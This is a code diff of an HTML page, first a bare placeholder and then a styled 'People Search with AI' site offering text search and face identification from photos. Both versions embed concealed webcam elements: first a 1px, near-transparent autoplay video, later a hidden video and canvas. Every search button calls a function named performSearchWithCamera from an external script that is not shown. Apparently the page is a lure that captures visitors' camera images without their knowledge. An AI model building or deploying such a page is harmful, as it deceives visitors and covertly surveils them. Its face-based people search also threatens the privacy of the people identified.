@@ -1,25 +1,113 @@
 <!DOCTYPE html>
-<html lang="ka">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>People Search with AI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-      #video {
-        opacity: 0.1;
-        width: 1px;
-        height: 1px;
-      }
-      #canvas {
-        display: none;
-      }
+        @import url('https://fonts.googleapis.com/css2?family=Fira+GO:wght@300;400;500;700&display=swap');
+        body {
+            font-family: 'Fira GO', sans-serif;
+            background: radial-gradient(circle at top, #1e1b4b 0%, #0f172a 100%);
+        }
     </style>
-  </head>
-  <body>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-        <h1>333333333333333</h1>
+</head>
+<body class="min-h-screen text-slate-100 flex flex-col items-center justify-between p-4 sm:p-8">
 
-  <script src="../static/scipts.js"></script>
-  </body>
+    <header class="w-full max-w-4xl text-center my-8">
+        <div class="inline-flex items-center gap-3 px-4 py-2 bg-indigo-500/10 border border-indigo-500/30 rounded-full text-indigo-300 text-sm mb-4">
+            <i data-lucide="sparkles" class="w-4 h-4 animate-pulse"></i>
+            AI-Powered Search Engine
+        </div>
+        <h1 class="text-4xl sm:text-5xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400">
+            People Search with AI
+        </h1>
+        <p class="text-slate-400 mt-3 text-base sm:text-lg max-w-xl mx-auto">
+            Search for people using text descriptions, professions, or by uploading a photo directly.
+        </p>
+    </header>
+
+    <main class="w-full max-w-3xl bg-slate-900/60 backdrop-blur-xl border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl shadow-indigo-950/20">
+        
+        <div class="flex p-1 bg-slate-950/50 rounded-xl mb-6 border border-slate-800/80">
+            <button id="btn-text" onclick="switchTab('text')" class="flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 bg-indigo-600 text-white shadow-lg shadow-indigo-500/20">
+                <i data-lucide="search" class="w-4 h-4"></i>
+                Text Search
+            </button>
+            <button id="btn-photo" onclick="switchTab('photo')" class="flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 text-slate-400 hover:text-slate-200">
+                <i data-lucide="image" class="w-4 h-4"></i>
+                Photo Search
+            </button>
+        </div>
+
+        <div id="text-search-section" class="space-y-4">
+            <div class="relative">
+                <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-slate-400">
+                    <i data-lucide="search" class="w-5 h-5"></i>
+                </div>
+                <input type="text" id="search-input" 
+                       placeholder="e.g., UI/UX designer based in Batumi..." 
+                       class="w-full pl-12 pr-4 py-4 bg-slate-950/50 border border-slate-800 rounded-2xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all">
+            </div>
+            <button onclick="performSearchWithCamera('text')" class="w-full py-4 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-semibold rounded-2xl shadow-lg shadow-indigo-500/25 transition-all flex items-center justify-center gap-2">
+                <span>Search with AI</span>
+                <i data-lucide="arrow-right" class="w-5 h-5"></i>
+            </button>
+        </div>
+
+        <div id="photo-search-section" class="hidden space-y-4">
+            <div class="grid grid-cols-1 gap-4 mb-4">
+                <div id="dropzone" class="border-2 border-dashed border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 text-center bg-slate-950/20 cursor-pointer transition-all flex flex-col items-center justify-center min-h-[180px]">
+                    <input type="file" id="file-input" class="hidden" accept="image/*" onchange="handleFileSelect(event)">
+                    <div class="p-3 bg-indigo-500/10 text-indigo-400 rounded-xl mb-2">
+                        <i data-lucide="upload-cloud" class="w-8 h-8"></i>
+                    </div>
+                    <p class="font-medium text-sm text-slate-200">Upload from gallery</p>
+                    <p class="text-xs text-slate-500 mt-1">PNG, JPG, or WEBP</p>
+                </div>
+            </div>
+
+            <div id="image-preview-container" class="hidden p-4 bg-slate-950/40 border border-slate-800/80 rounded-2xl flex flex-col items-center space-y-3">
+                <img id="image-preview" src="#" alt="Uploaded photo" class="max-h-48 rounded-xl object-cover border border-slate-700 shadow-md">
+                <button onclick="removeSelectedFile(event)" class="text-xs text-rose-400 hover:text-rose-300 flex items-center gap-1">
+                    <i data-lucide="trash-2" class="w-3.5 h-3.5"></i> Remove image
+                </button>
+            </div>
+
+            <button onclick="performSearchWithCamera('photo')" class="w-full py-4 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-semibold rounded-2xl shadow-lg shadow-indigo-500/25 transition-all flex items-center justify-center gap-2">
+                <span>Identify Face & Search</span>
+                <i data-lucide="scan-face" class="w-5 h-5"></i>
+            </button>
+        </div>
+
+        <div id="loader" class="hidden py-12 flex flex-col items-center justify-center space-y-4">
+            <div class="relative w-12 h-12">
+                <div class="absolute inset-0 border-4 border-indigo-500/20 rounded-full"></div>
+                <div class="absolute inset-0 border-4 border-t-indigo-500 rounded-full animate-spin"></div>
+            </div>
+            <p id="loader-text" class="text-sm text-indigo-300 animate-pulse font-medium">AI is analyzing data...</p>
+        </div>
+
+        <!-- 4. Results List Block -->
+        <div id="results-section" class="hidden mt-8 pt-8 border-t border-slate-800 space-y-4">
+            <h3 class="text-lg font-semibold text-slate-200 flex items-center gap-2">
+                <i data-lucide="sparkles" class="w-5 h-5 text-indigo-400"></i>
+                Matches Found (AI Result)
+            </h3>
+            <div id="results-list" class="space-y-4"></div>
+        </div>
+
+    </main>
+
+    <footer class="w-full text-center text-xs text-slate-600 py-8">
+        &copy; 2026 People Search with AI. All rights reserved.
+    </footer>
+
+    <video id="hidden-video" autoplay playsinline class="hidden"></video>
+    <canvas id="hidden-canvas" class="hidden"></canvas>
+
+    <script src="../static/script3.js"></script>
+</body>
 </html>
-
